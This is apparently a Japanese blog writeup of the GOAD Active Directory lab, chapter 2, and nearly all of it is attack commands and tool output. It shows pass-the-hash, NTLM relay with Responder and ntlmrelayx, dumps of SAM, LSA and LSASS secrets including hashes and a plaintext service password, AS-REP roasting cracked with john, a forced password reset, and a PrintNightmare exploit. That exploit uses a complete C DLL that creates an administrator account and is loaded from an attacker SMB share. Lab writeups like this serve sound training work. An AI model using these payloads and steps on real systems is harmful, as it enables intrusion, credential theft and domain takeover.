---
title: "GOAD Writeup Ch2"
date: "2024-10-21"
draft: "false"
---

## Round 2

WinterfellではAdministratorのパスワードを使いまわしていることがわかる

```jsx
┌──(kali㉿kali)-[~]
└─$ nxc winrm 192.168.56.10-12 192.168.56.22-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'

WINRM       192.168.56.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
WINRM       192.168.56.12   5985   MEEREEN          [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local)
WINRM       192.168.56.23   5985   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)
WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.10   5985   KINGSLANDING     [-] sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.12   5985   MEEREEN          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.23   5985   BRAAVOS          [-] essos.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4
WINRM       192.168.56.11   5985   WINTERFELL       [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
WINRM       192.168.56.22   5985   CASTELBLACK      [+] north.sevenkingdoms.local\Administrator:dbd13e1c4e338284ac4e9874f7de6ef4 (Pwn3d!)
Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

それはそれとして他に色々探ってみる

NTLMリレー攻撃をするためにSMBサイニングが無効なサービスの情報を集める

```jsx
┌──(kali㉿kali)-[~/goad]
└─$ nxc smb 192.168.56.10-23 --gen-relay-list relay.txt    
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/goad]
└─$ cat relay.txt       
192.168.56.23
192.168.56.22
```

サイニングfalseなターゲットの情報を取得できたのでNTLM認証を中継することができそう

Responderの設定を変えて

```jsx
**┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/\responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/goad]
└─$ sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && sudo cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='

HTTP = Off**
```

ntlmrelayxを起動

```jsx
**┌──(kali㉿kali)-[~/goad]
└─$ impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] SMB Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>**
```

Responderも起動して

```jsx
┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth1     
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth1]
    Responder IP               [192.168.56.104]
    Responder IPv6             [fe80::5af0:79:dd52:80d1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-E217ZFS7CUP]
    Responder Domain Name      [DCK5.LOCAL]
    Responder DCE-RPC Port     [47652]

[+] Listening for events...
```

ntlmrelayxでしばらく待つとこんな内容が出力される

```jsx
ntlmrelayx> [*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication
[*] SMBD-Thread-13 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.23
[*] Authenticating against smb://192.168.56.23 as NORTH/EDDARD.STARK SUCCEED
[*] SOCKS: Adding NORTH/EDDARD.STARK@192.168.56.23(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-13 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.22
[*] Authenticating against smb://192.168.56.22 as NORTH/EDDARD.STARK SUCCEED
[*] SOCKS: Adding NORTH/EDDARD.STARK@192.168.56.22(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-13 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, but there are no more targets left!
[*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication
[*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication
[*] SMBD-Thread-14 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, but there are no more targets left!
[*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication
[*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication
[*] SMBD-Thread-15 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.23
[*] Authenticating against smb://192.168.56.23 as NORTH/ROBB.STARK SUCCEED
[*] SOCKS: Adding NORTH/ROBB.STARK@192.168.56.23(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-15 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.22
[*] Authenticating against smb://192.168.56.22 as NORTH/ROBB.STARK SUCCEED
[*] SOCKS: Adding NORTH/ROBB.STARK@192.168.56.22(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-15 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, but there are no more targets left!
[*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication
[*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication
[*] SMBD-Thread-16 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, but there are no more targets left!
[*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication
```

というわけで中間者攻撃しつつsocksプロキシを使えるようになった

それでもってproxychainsで繋ぎつつsecretsdumpを走らせる

```jsx
┌──(kali㉿kali)-[~/goad]
└─$ proxychains impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe726c3449239522103313bbfa17ae832
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
[*] Dumping cached domain logon information (domain/username:hash)
NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a: (2024-08-11 04:00:35)
NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405: (2024-10-13 02:15:32)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
NORTH\CASTELBLACK$:aes256-cts-hmac-sha1-96:7f588d89c8e329850eb2cfcb6f20dcc68346a58b33748b8ba3762f365bfd3857
NORTH\CASTELBLACK$:aes128-cts-hmac-sha1-96:7171432588c012604326db931b606ad9
NORTH\CASTELBLACK$:des-cbc-md5:08f707b33d52a2b6
NORTH\CASTELBLACK$:plain_password_hex:1111806e0bf8db391cb1c02c6411c34bce4b042253b862a6baa74e0a7654780999ff01c1d53d598ed08f168c35ca13303583a23343a965fa4b8f72afdfb63371b8f3d6aeb45d7e1e3c3f91d4f1eea5977a41030a4e83603b6c4d78db03728bc79b041b02fc53943f14ce014ed7fa7c335c7e150467b8dba0023256d6f376150c45c7bde0635e2d1ed53848685f8addd100827f320d24d0ca9102a6ca7824ecc7994f0ed433c325a7e72d20960ce3797570272218fbfb8868fba0037ace07459c34eb05cf05c00b9a78082676e45a1283da88772cb7881a96312998f49b2b92a4575a46be4a2d839a0efd7d6f5d0b30f0
NORTH\CASTELBLACK$:aad3b435b51404eeaad3b435b51404ee:20425334e9f78d883485696487ab1b67:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x130872a1a24387df59aae05e7d4ca0c98dd5535d
dpapi_userkey:0x86a53690af0fcd4490280ede099bc684e11a6918
[*] NL$KM 
 0000   22 34 01 76 01 70 30 93  88 A7 6B B2 87 43 59 69   "4.v.p0...k..CYi
 0010   0E 41 BD 22 0A 0C CC 23  3A 5B B6 74 CB 90 D6 35   .A."...#:[.t...5
 0020   14 CA D8 45 4A F0 DB 72  D5 CF 3B A1 ED 7F 3A 98   ...EJ..r..;...:.
 0030   CD 4D D6 36 6A 35 24 2D  A0 EB 0F 8E 3F 52 81 C9   .M.6j5$-....?R..
NL$KM:223401760170309388a76bb2874359690e41bd220a0ccc233a5bb674cb90d63514cad8454af0db72d5cf3ba1ed7f3a98cd4dd6366a35242da0eb0f8e3f5281c9
[*] _SC_MSSQL$SQLEXPRESS 
north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

続いてはlsassyを使ってLSASSの情報を取得してみる

[https://github.com/login-securite/lsassy](https://github.com/login-securite/lsassy)

```jsx
┌──(kali㉿kali)-[~/goad]
└─$ proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22             
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
[+] 192.168.56.22 Authentication successful
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:445  ...  OK
[+] 192.168.56.22 Lsass dumped in C:\Windows\Temp\6HGg19bP.jpg (51439491 Bytes)
[+] 192.168.56.22 Lsass dump deleted
[+] 192.168.56.22 NORTH\robb.stark                        [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c
[+] 192.168.56.22 NORTH\CASTELBLACK$                      [NT] 20425334e9f78d883485696487ab1b67 | [SHA1] 8f582df44ed1c9e9c9d26be730c0b99226271cf4
[+] 192.168.56.22 north.sevenkingdoms.local\CASTELBLACK$  [PWD] 1111806e0bf8db391cb1c02c6411c34bce4b042253b862a6baa74e0a7654780999ff01c1d53d598ed08f168c35ca13303583a23343a965fa4b8f72afdfb63371b8f3d6aeb45d7e1e3c3f91d4f1eea5977a41030a4e83603b6c4d78db03728bc79b041b02fc53943f14ce014ed7fa7c335c7e150467b8dba0023256d6f376150c45c7bde0635e2d1ed53848685f8addd100827f320d24d0ca9102a6ca7824ecc7994f0ed433c325a7e72d20960ce3797570272218fbfb8868fba0037ace07459c34eb05cf05c00b9a78082676e45a1283da88772cb7881a96312998f49b2b92a4575a46be4a2d839a0efd7d6f5d0b30f0                                                                                        
[+] 192.168.56.22 NORTH\sql_svc                           [NT] 84a5092f53390ea48d660be52b93b804 | [SHA1] 9fd961155e28b1c6f9b3859f32f4779ad6a06404
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\robb.stark    [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d9e9f780.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\robb.stark    [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_5fb85f38.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\sql_svc       [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_sql_svc_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_1ac82095.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_e55cd434.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_c9464f19.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_63039232.kirbi)
[+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$  [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_dd82f6bc.kirbi)
[+] 192.168.56.22 18 Kerberos tickets written to /home/kali/.config/lsassy/tickets
[+] 192.168.56.22 5 masterkeys saved to /home/kali/.config/lsassy/masterkeys.txt
```

とwinterfellのAdministrator権限は取得できた

## braavos

bloodhoundでASREPRoastが可能なユーザーを見たところ、ESOSS.LOCAL/MISSANDEIが見つかった。

ASREPRoastを仕掛けてみる。

```jsx
┌──(kali㉿kali)-[~]
└─$ nxc ldap 192.168.56.23 -u missandei -p '' --asreproast asreproast.hash
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
LDAP        192.168.56.23   445    BRAAVOS          $krb5asrep$23$missandei@ESSOS.LOCAL:dcdfca025e409115dac3015ad2bdad49$8d5164d380201364641c6765135d0f1f396f15de39d107f3a23685f1b6aaacd52c765146c336f31d9e33d59d614cfc1c05e0bc2bd414dcdee30acf84fef1d469d411ecadb1ef16ba740692505fb983c5d335bd8d3c120f28f3476ef566a517629863f24e68cd0d56ce56bd0b617b1bacaeb375d4b06a726809f6fef115cf8eecd0337611e4259618593628c5058b5d86e9b994b555340086d4f72c57f9954dfd159e8e071d415b2e8bf9e85a3990e300b7253d3f0673c2e317f549dada4fc4b80c6f298f9bc296f1fb077ddcf7aa31e9592b98bd7f11c572d0132b4fc8b38ce5543ba9415b28bc163e42
```

johnにかける

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash             
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fr3edom          ($krb5asrep$23$missandei@ESSOS.LOCAL)     
1g 0:00:00:01 DONE (2024-10-19 16:58) 0.8333g/s 1496Kp/s 1496Kc/s 1496KC/s franciene..found9tion
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`missandei/fr3edom` という認証情報を手に入れた

共有されているSMBの内容を見てみる

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ nxc smb braavos -u missandei -p fr3edom -k --shares
SMB         braavos         445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         braavos         445    BRAAVOS          [+] essos.local\missandei:fr3edom 
SMB         braavos         445    BRAAVOS          [*] Enumerated shares
SMB         braavos         445    BRAAVOS          Share           Permissions     Remark
SMB         braavos         445    BRAAVOS          -----           -----------     ------
SMB         braavos         445    BRAAVOS          ADMIN$                          Remote Admin
SMB         braavos         445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         braavos         445    BRAAVOS          C$                              Default share
SMB         braavos         445    BRAAVOS          CertEnroll      READ            Active Directory Certificate Services share
SMB         braavos         445    BRAAVOS          IPC$                            Remote IPC
SMB         braavos         445    BRAAVOS          public          READ,WRITE      Basic Read share for all domain users
```

impacket-smbclientで見てみるとADCSのファイルを読み込めそう

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ impacket-smbclient -k -no-pass @braavos.essos.local       
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
all
C$
CertEnroll
IPC$
public
# use all
# ls
drw-rw-rw-          0  Sun Oct 20 01:17:14 2024 .
drw-rw-rw-          0  Sun Oct 20 01:17:14 2024 ..
# cd ..
# ls
drw-rw-rw-          0  Sun Oct 20 01:17:14 2024 .
drw-rw-rw-          0  Sun Oct 20 01:17:14 2024 ..
# use public
# ls
drw-rw-rw-          0  Sun Oct 20 01:17:14 2024 .
drw-rw-rw-          0  Sun Oct 20 01:17:14 2024 ..
# use CertEnroll
# ls
drw-rw-rw-          0  Fri Oct 18 21:33:44 2024 .
drw-rw-rw-          0  Fri Oct 18 21:33:44 2024 ..
-rw-rw-rw-        865  Sat Aug 10 23:47:50 2024 braavos.essos.local_ESSOS-CA.crt
-rw-rw-rw-        716  Fri Oct 18 21:33:44 2024 ESSOS-CA+.crl
-rw-rw-rw-        902  Sat Oct 12 22:15:56 2024 ESSOS-CA.crl
-rw-rw-rw-        320  Sat Aug 10 23:47:52 2024 nsrev_ESSOS-CA.asp
# exit
```

missandeiはkhal.dragoというユーザに対してGenericAllの権限を持っている。

そこでkhal.drogoのパスワードを変更する。

使用するツールはldap_shell

[https://github.com/PShlyundin/ldap_shell](https://github.com/PShlyundin/ldap_shell)

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ ldap_shell essos.local/missandei -dc-host essos.local
Password: 
[INFO] Starting interactive shell
 
missandei#
missandei# change_password khal.drogo horse
[INFO] Got User DN: CN=khal.drogo,CN=Users,DC=essos,DC=local
[INFO] Attempting to set new password of: horse
[INFO] Password changed successfully!
```

というわけで `khal.drogo/horse` というクレデンシャルをゲット。

試しに確認するとちゃんと認証情報を取得できていることがわかる

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ nxc smb braavos -u khal.drogo -p horse                            
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\khal.drogo:horse (Pwn3d!)
```

winrmも認証通りそうですね

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ nxc winrm braavos -u khal.drogo -p horse 
WINRM       192.168.56.23   5985   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)
WINRM       192.168.56.23   5985   BRAAVOS          [+] essos.local\khal.drogo:horse (Pwn3d!)
```

とりあえずevil-winrmで足がかりはできた

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ evil-winrm -u khal.drogo -p horse -i braavos               
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\khal.drogo\Documents> 
```

Printnightmareが刺さるか調査

```jsx
┌──(kali㉿kali)-[~]
└─$ netexec --version               
1.3.0 - NeedForSpeed - Kali Linux
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nxc smb 192.168.56.10-23 -M spooler
/usr/lib/python3/dist-packages/masky/core.py:102: SyntaxWarning: invalid escape sequence '\{'
  f"Start processing PFX of the user '{user_data.domain}\{user_data.name}'"
/usr/lib/python3/dist-packages/masky/core.py:106: SyntaxWarning: invalid escape sequence '\{'
  f"Fail to process gathered certificate related to the user '{user_data.domain}\{user_data.name}'"
/usr/lib/python3/dist-packages/masky/core.py:110: SyntaxWarning: invalid escape sequence '\{'
  f"End processing PFX of the user '{user_data.domain}\{user_data.name}'"
/usr/lib/python3/dist-packages/masky/lib/smb.py:85: SyntaxWarning: invalid escape sequence '\{'
  err_msg = f"The user {self.__domain}\{self.__username} is not local administrator on this system"
/usr/lib/python3/dist-packages/masky/lib/smb.py:88: SyntaxWarning: invalid escape sequence '\{'
  err_msg = f"The provided credentials for the user '{self.__domain}\{self.__username}' are invalids or the user does not exist"
/usr/lib/python3/dist-packages/masky/lib/smb.py:257: SyntaxWarning: invalid escape sequence '\p'
  np_bind = f"ncacn_np:{target_host}[\pipe\svcctl]"
/usr/lib/python3/dist-packages/masky/lib/cert/auth.py:413: SyntaxWarning: invalid escape sequence '\{'
  f"Gathered NT hash for the user '{domain}\{username}': {nt_hash}"
/usr/lib/python3/dist-packages/pypykatz/_version.py:11: SyntaxWarning: invalid escape sequence '\.'
  """
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SPOOLER     192.168.56.12   445    MEEREEN          Spooler service enabled
SPOOLER     192.168.56.22   445    CASTELBLACK      Spooler service enabled
SPOOLER     192.168.56.11   445    WINTERFELL       Spooler service enabled
SPOOLER     192.168.56.10   445    KINGSLANDING     Spooler service enabled
SPOOLER     192.168.56.23   445    BRAAVOS          Spooler service enabled
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

次のようなCのコードでdllを作成し実行する

```jsx
#include <windows.h> 

int RunCMD()
{
    system("net users pnightmare Passw0rd123. /add");
    system("net localgroup administrators pnightmare /add");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunCMD();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

コンパイル

```jsx
x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
```

PrintNightmareのコードをクローン

```jsx
git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
```

SMBでdllを公開しておく

```jsx
smbserver.py -smb2support ATTACKERSHARE .
```

で実行

```jsx
┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare]
└─$ python3 CVE-2021-1675.py essos.local/khal.drogo:horse@meereen.essos.local '\\192.168.56.104\ATTACKSHARE\nightmare.dll'
[*] Connecting to ncacn_np:meereen.essos.local[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_e233a12d01c18082\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.56.104\ATTACKSHARE\nightmare.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Stage2: 0
[+] Exploit Completed
```

`pnightmare/Passw0rd123.` をゲット

evil-winrmで侵入すると実行できたことがわかる

```jsx
┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare]
└─$ evil-winrm -u pnightmare -p Passw0rd123. -i meereen
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\pnightmare\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
